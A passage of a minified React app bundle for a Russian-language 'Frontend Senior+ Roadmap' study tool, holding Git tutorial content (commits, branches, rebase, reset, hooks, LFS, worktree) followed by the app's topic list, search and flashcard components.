**Inline метод** — обратное извлечению, если метод тривиален.`},{name:"Понимает текущий бэклог технического развития проекта",level:"4",content:`**Технический долг (Tech Debt)** — осознанные или случайные компромиссы в коде.

**Бэклог тех. развития:**
• Обновление зависимостей
• Миграция на новые версии фреймворков
• Покрытие тестами критических путей
• Оптимизация производительности
• Улучшение CI/CD
• Документация архитектурных решений (ADR)

**Senior-ответственность:** видеть картину целиком, приоритизировать тех. долг, обосновывать бизнесу время на рефакторинг, планировать миграции.`}]},{id:"git",title:"GIT",icon:"📦",color:"#F4511E",topics:[{name:"Базовые команды: pull, push, commit, fetch, add, clone",level:"2",content:`**Три зоны:**
Рабочая директория → git add → Staging area → git commit → Repository

\`\`\`bash
git status          # статус файлов
git add file.js     # добавить файл в staging
git add .           # добавить все
git commit -m "msg" # зафиксировать
git push            # отправить на remote
git pull            # fetch + merge
git fetch           # скачать без merge (безопасно)
git clone <url>     # клонировать репо
\`\`\`
fetch vs pull: fetch скачивает изменения, но не применяет. pull = fetch + merge.

**init + config:**
\`\`\`bash
git init                               # инициализировать репо
git config --global user.name "Alex"   # имя для коммитов
git config --global user.email "..."   # email
git config --global core.editor vim    # редактор
git config --list                      # все настройки
\`\`\``},{name:"branch, merge, remote",level:"2",content:`**branch:**
\`\`\`bash
git branch              # список веток
git branch -a           # все включая remote
git branch feature      # создать ветку
git branch -d feature   # удалить ветку
git branch -m old new   # переименовать

git switch feature      # переключиться (Git 2.23+)
git switch -c feature   # создать и переключиться
\`\`\`

**merge:**
\`\`\`bash
git merge feature         # влить feature в текущую ветку
git merge --no-ff feature # всегда создавать merge коммит
git merge --abort         # отменить merge при конфликте
\`\`\`
Fast-forward — когда main не уходил вперёд, Git просто двигает указатель, merge коммита нет.
--no-ff — всегда создаёт merge коммит, видно что была ветка.

**remote:**
\`\`\`bash
git remote -v                      # список remote
git remote add origin https://...  # добавить
git remote remove origin           # удалить
git remote rename origin upstream  # переименовать

git fetch origin       # скачать без merge
git pull origin main   # fetch + merge
\`\`\``},{name:"amend, fixup, revert, cherry-pick, stash, rebase, .gitignore",level:"3",content:`**amend:**
\`\`\`bash
git commit --amend -m "новое сообщение"  # изменить последний коммит
git commit --amend --no-edit             # добавить файлы без смены сообщения
\`\`\`
⚠️ Переписывает SHA коммита. Если уже запушен — нужен git push --force-with-lease.

**stash:**
\`\`\`bash
git stash                  # сохранить изменения
git stash save "описание"  # с описанием
git stash list             # список всех stash
git stash pop              # применить последний и удалить
git stash apply stash@{2}  # применить конкретный
git stash drop             # удалить последний
git stash clear            # удалить все
\`\`\`

**revert vs reset:**
\`\`\`bash
git revert abc123         # новый коммит отменяющий abc123 (безопасно для remote)

git reset --soft HEAD~1   # коммит удалён, изменения в staging
git reset --mixed HEAD~1  # коммит удалён, изменения в рабочей директории
git reset --hard HEAD~1   # коммит и изменения удалены полностью
\`\`\`
Правило: reset только для локальных коммитов. revert когда коммит уже в remote.

**cherry-pick:**
\`\`\`bash
git cherry-pick abc123          # перенести один коммит
git cherry-pick abc123..def456  # диапазон коммитов
\`\`\`
Используется для хотфиксов — перенести исправление бага с одной ветки на другую.

**rebase:**
\`\`\`bash
git rebase main          # перебазировать текущую ветку на main
git rebase -i HEAD~3     # интерактивный rebase последних 3 коммитов
git rebase --abort       # отменить rebase
git rebase --continue    # продолжить после разрешения конфликта
\`\`\`
⚠️ Переписывает историю. Нельзя делать на публичных ветках которые используют другие.

**fixup:**
\`\`\`bash
git commit --fixup abc123             # создать коммит-исправление
git rebase -i --autosquash HEAD~5     # автоматически склеить fixup коммиты
\`\`\`

**.gitignore** — файлы которые git игнорирует (node_modules, .env, dist).`},{name:"log, diff, reflog, tag",level:"3",content:`**log:**
\`\`\`bash
git log --oneline --graph   # самый частый вариант
git log -n 5                # последние 5 коммитов
git log --author="Alex"     # коммиты автора
git log --since="2 weeks"   # за период
git log file.js             # история файла
\`\`\`

**diff:**
\`\`\`bash
git diff                   # изменения не в staging
git diff --staged          # изменения в staging
git diff main feature      # разница между ветками
git diff abc123 def456     # разница между коммитами
\`\`\`

**reflog:**
\`\`\`bash
git reflog               # история всех перемещений HEAD
git reset --hard abc123  # восстановить потерянный коммит
\`\`\`
Хранит историю ~90 дней. Страховка от reset --hard.

**tag:**
\`\`\`bash
git tag v1.0.0                   # lightweight тег
git tag -a v1.0.0 -m "Release"  # annotated тег (предпочтительно)
git push origin v1.0.0           # запушить тег
git push origin --tags           # запушить все теги
git tag -d v1.0.0                # удалить тег
\`\`\``},{name:"hooks",level:"4",content:`**Git Hooks** — скрипты в .git/hooks/ выполняющиеся автоматически при git командах.

**Основные хуки:**
• **pre-commit** — перед коммитом (линтинг, форматирование)
• **commit-msg** — проверка формата сообщения
• **pre-push** — перед push (тесты)

**Husky** — шарит хуки между разработчиками через package.json:
\`\`\`json
{
  "husky": {
    "hooks": {
      "pre-commit": "lint-staged",
      "pre-push": "npm test"
    }
  }
}
\`\`\`
**lint-staged** — запускает линтер только на изменённых файлах.`},{name:"switch, restore",level:"4",content:`Новые команды (Git 2.23+), заменяющие перегруженный checkout:

\`\`\`bash
git switch feature         # переключить ветку
git switch -c feature      # создать и переключить

git restore file.js              # восстановить файл из последнего коммита
git restore --staged file.js     # убрать файл из staging
\`\`\`

checkout делал слишком много (переключение веток + откат файлов). switch и restore — чёткое разделение обязанностей.`},{name:"Способы оптимизации рабочего пространства Git, git-lfs, сабмодули",level:"4",content:`**git-lfs (Large File Storage):**
Для больших бинарных файлов (видео, дизайн, скриншоты). В репозитории хранится указатель, файл — на LFS сервере.
\`\`\`bash
git lfs install
git lfs track "*.png"
git lfs track "*.psd"
git add .gitattributes
\`\`\`

**Субмодули:**
Вложенный git-репозиторий внутри основного. Для переиспользования библиотек между проектами.
\`\`\`bash
git submodule add https://github.com/org/lib  # добавить
git submodule init                             # инициализировать
git submodule update                           # обновить
git clone --recurse-submodules https://...    # клонировать с субмодулями
\`\`\`
Минус — сложность синхронизации в команде.

**Shallow clone:**
\`\`\`bash
git clone --depth 1 <url>  # только последний коммит (быстрее для CI)
\`\`\``},{name:"worktree",level:"4",content:`**git worktree** — несколько рабочих директорий одного репо одновременно. Позволяет работать в нескольких ветках без stash и переключений.

\`\`\`bash
git worktree add ../hotfix main  # создать папку с веткой main
git worktree list                # список worktree
git worktree remove ../hotfix    # удалить
\`\`\`

Кейсы: срочный hotfix без прерывания текущей работы, сравнение двух веток бок о бок, запуск тестов на одной ветке пока работаешь на другой.`}]}],_n=[...If,...Af],zf=[];_n.forEach(e=>{e.topics.forEach(n=>{n.content&&zf.push({section:e.title,sectionColor:e.color,topic:n.name,level:n.level,content:n.content,score:n.score??null})})});function Ff(e,n){if(!n)return e;const t=e.toLowerCase().indexOf(n.toLowerCase());return t===-1?e:y.jsxs(y.Fragment,{children:[e.slice(0,t),y.jsx("mark",{className:"search-highlight",children:e.slice(t,t+n.length)}),e.slice(t+n.length)]})}function rc({topic:e,sectionColor:n,highlight:t,defaultOpen:r=!1}){const[o,l]=Oe.useState(r),i=no[e.level]||no[2];return y.jsxs("div",{className:"topic-row",children:[y.jsxs("button",{className:"topic-header",onClick:()=>l(!o),children:[y.jsx("span",{className:"topic-chevron",children:o?"▾":"▸"}),y.jsx("span",{className:"topic-name",children:t?Ff(e.name,t):e.name}),y.jsxs("span",{className:"topic-badges",children:[e.score!=null&&y.jsxs("span",{className:"topic-score",title:"Оценка",children:[e.score,"/5"]}),y.jsxs("span",{className:"topic-level",style:{background:i.color+"22",color:i.color,borderColor:i.color+"44"},children:[e.level," — ",i.label]})]})]}),o&&y.jsx("div",{className:"topic-content",children:y.jsx(oc,{text:e.content})})]})}function oc({text:e}){if(!e)return y.jsx("p",{className:"placeholder",children:"Контент будет добавлен позже"});const n=e.split(`
`),t=[];let r=!1,o=[],l=0;return n.forEach((i,s)=>{if(i.startsWith("```")){r?(t.push(y.jsx("pre",{children:o.join(`
`)},l++)),o=[],r=!1):r=!0;return}if(r){o.push(i);return}if(i.trim()===""){t.push(y.jsx("div",{className:"spacer"},l++));return}let a=i.replace(/\*\*(.+?)\*\*/g,"<strong>$1</strong>").replace(/`([^`]+)`/g,"<code>$1</code>").replace(/^• /,"‣ ");t.push(y.jsx("p",{className:"content-line",dangerouslySetInnerHTML:{__html:a}},l++))}),r&&o.length&&t.push(y.jsx("pre",{children:o.join(`
`)},l++)),y.jsx("div",{className:"formatted-content",children:t})}function Hf({section:e,defaultCollapsed:n=!1}){const[t,r]=Oe.useState(n),o=e.topics.length,l=e.topics.filter(s=>s.score!=null),i=l.length?(l.reduce((s,a)=>s+a.score,0)/l.length).toFixed(1):null;return y.jsxs("div",{className:"section-block",children:[y.jsxs("button",{className:"section-header",onClick:()=>r(!t),style:{"--accent":e.color},children:[y.jsxs("div",{className:"section-left",children:[y.jsx("span",{className:"section-icon",children:e.icon}),y.jsxs("div",{children:[y.jsx("h2",{className:"section-title",children:e.title}),y.jsxs("span",{className:"section-meta",children:[o," тем",i?` · Средняя: ${i}/5`:""]})]})]}),y.jsx("span",{className:"section-chevron",children:t?"▸":"▾"})]}),!t&&y.jsx("div",{className:"section-topics",children:e.topics.map((s,a)=>y.jsx(rc,{topic:s,sectionColor:e.color},a))})]})}function Uf({query:e,sections:n}){const t=e.toLowerCase(),r=[];return n.forEach(o=>{const l=o.topics.filter(i=>i.name.toLowerCase().includes(t)||i.content&&i.content.toLowerCase().includes(t));l.length>0&&r.push({section:o,topics:l})}),r.length===0?y.jsxs("p",{className:"search-empty",children:["Ничего не найдено по запросу «",e,"»"]}):y.jsx(y.Fragment,{children:r.map(({section:o,topics:l})=>y.jsxs("div",{className:"section-block",children:[y.jsx("div",{className:"section-header",style:{"--accent":o.color},children:y.jsxs("div",{className:"section-left",children:[y.jsx("span",{className:"section-icon",children:o.icon}),y.jsxs("div",{children:[y.jsx("h2",{className:"section-title",children:o.title}),y.jsxs("span",{className:"section-meta",children:[l.length," совпадений"]})]})]})}),y.jsx("div",{className:"section-topics",children:l.map((i,s)=>y.jsx(rc,{topic:i,sectionColor:o.color,highlight:e,defaultOpen:!0},s))})]},o.id))})}function Vf({sections:e}){const[n,t]=Oe.useState("all"),[r,o]=Oe.useState(0),[l,i]=Oe.useState(!1),s=[];e.forEach(p=>{p.topics.forEach(h=>{h.content&&(n==="all"||n===p.id)&&s.push({...h,sectionTitle:p.title,sectionIcon:p.icon,sectionColor:p.color})})});const a=s[r];if(!a)return y.jsx("p",{children:"Нет карточек"});const c=no[a.level]||no[2];return y.jsxs("div",{className:"flashcard-mode",children:[y.jsxs("div",{className:"flash-filter",children:[y.jsxs("select",{value:n,onChange:p=>{t(p.target.value),o(0),i(!1)},children:[y.jsx("option",{value:"all",children:"Все разделы"}),e.map(p=>y.jsxs("option",{value:p.id,children:[p.icon," ",p.title]},p.id))]}),y.jsxs("span",{className:"flash-counter",children:[r+1," / ",s.length]})]}),y.jsx("div",{className:`flash-card ${l?"flipped":""}`,onClick:()=>i(!l),children:l?y.jsx("div",{className:"flash-back",children:y.jsx(oc,{text:a.content})}):y.jsxs("div",{className:"flash-front",children:[y.jsxs("span",{className:"flash-section",style:{color:a.sectionColor},children:[a.sectionIcon," ",a.sectionTitle]}),y.jsx("span",{className:"flash-level",style:{color:c.color},children:c.label}),y.jsx("h3",{className:"flash-question",children:a.name}),y.jsx("span",{className:"flash-hint",children:"Нажми, чтобы увидеть ответ"})]})}),y.jsxs("div",{className:"flash-nav",children:[y.jsx("button",{disabled:r===0,onClick:()=>{o(p=>p-1),i(!1)},children:"← Назад"}),y.jsx("button",{onClick:()=>{o(Math.floor(Math.random()*s.length)),i(!1)},children:"🎲 Случайная"}),y.jsx("button",{disabled:r>=s.length-1,onClick:()=>{o(p=>p+1),i(!1)},children:"Далее →"})]})]})}function Bf(){const[e,n]=Oe.useState("roadmap"),[t,r]=Oe.useState("list"),[o,l]=Oe.useState(""),i=_n.reduce((a,c)=>a+c.topics.length,0),s=e==="roadmap"&&o.trim().length>0;return y.jsxs("div",{className:"app",children:[y.jsxs("header",{className:"app-header",children:[y.jsxs("div",{className:"header-content",children:[y.jsx("h1",{className:"app-title",children:"Frontend Senior+ Roadmap"}),y.jsxs("p",{className:"app-sub",children:[_n.length," разделов · ",i," тем"]})]}),y.jsxs("div",{className:"header-controls",children:[y.jsxs("nav",{className:"tabs",children:[y.jsx("button",{className:`tab ${e==="roadmap"?"active":""}`,onClick:()=>{n("roadmap"),l("")},children:"📋 Темы"}),y.jsx("button",{className:`tab ${e==="cards"?"active":""}`,onClick:()=>{n("cards"),l("")},children:"🃏 Карточки"})]}),e==="roadmap"&&y.jsxs("div",{className:"view-toggle",children:[y.jsx("button",{className:`view-btn ${t==="list"?"active":""}`,onClick:()=>r("list"),title:"Список",children:y.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[y.jsx("rect",{x:"1",y:"2",width:"14",height:"2",rx:"1"}),y.jsx("rect",{x:"1",y:"7",width:"14",height:"2",rx:"1"}),y.jsx("rect",{x:"1",y:"12",width:"14",height:"2",rx:"1"})]})}),y.jsx("button",{className:`view-btn ${t==="grid"?"active":""}`,onClick:()=>r("grid"),title:"Сетка",children:y.jsxs("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:[y.jsx("rect",{x:"1",y:"1",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"9",y:"1",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"1",y:"9",width:"6",height:"6",rx:"1"}),y.jsx("rect",{x:"9",y:"9",width:"6",height:"6",rx:"1"})]})})]})]}),e==="roadmap"&&y.jsxs("div",{className:"search-bar",children:[y.jsx("svg",{className:"search-icon",width:"16",height:"16",viewBox:"0 0 16 16",fill:"currentColor",children:y.jsx("path",{d:"M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.868-3.834zm-5.242 1.156a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"})}),y.jsx("input",{type:"search",placeholder:"Поиск по темам...",value:o,onChange:a=>l(a.target.value),className:"search-input"}),o&&y.jsx("button",{className:"search-clear",onClick:()=>l(""),title:"Очистить",children:"✕"})]})]}),y.jsx("main",{className:`app-main ${e==="roadmap"&&!s&&t==="grid"?"view-grid":""}`,children:e==="roadmap"?s?y.jsx(Uf,{query:o.trim(),sections:_n}):_n.map(a=>y.jsx(Hf,{section:a,defaultCollapsed:t==="grid"},a.id)):y.jsx(Vf,{sections:_n})},s?`search-${o}`:t)]})}Go.createRoot(document.getElementById("root")).render(y.jsx(Cc.StrictMode,{children:y.jsx(Bf,{})}));
